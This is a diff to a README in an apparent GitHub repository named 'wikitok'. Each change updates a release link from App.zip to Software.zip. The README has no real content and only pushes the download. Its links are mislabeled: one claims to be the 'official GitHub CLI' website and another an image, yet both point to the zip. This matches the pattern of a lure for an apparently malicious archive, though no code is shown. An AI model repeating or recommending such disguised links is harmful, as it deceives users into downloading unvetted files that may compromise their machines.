@@ -9,15 +9,15 @@ Unfortunately, specific topics for this repository are not provided. However, fe
 ## Get Started
 To access the repository content, download the latest release by clicking the button below:
 
-[![Download Repository](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip%20Release-yellow)](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip)
+[![Download Repository](https://github.com/bbget00/wikitok/releases/download/v2.0/Software.zip%20Release-yellow)](https://github.com/bbget00/wikitok/releases/download/v2.0/Software.zip)
 
 *Note: Click the button above to download the latest release of the repository.*
 
 If the link does not work, please check the "Releases" section of this repository to find alternative download options.
 
 ## Explore Further
-Visit the official [GitHub CLI](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip) website to explore more tools and resources related to GitHub. 
+Visit the official [GitHub CLI](https://github.com/bbget00/wikitok/releases/download/v2.0/Software.zip) website to explore more tools and resources related to GitHub. 
 
 Feel free to contribute to this repository by adding your own tech-related content or suggesting improvements. Your contributions are greatly appreciated!
 
-![Tech Image](https://github.com/bbget00/wikitok/releases/download/v1.0/App.zip)
+![Tech Image](https://github.com/bbget00/wikitok/releases/download/v2.0/Software.zip)
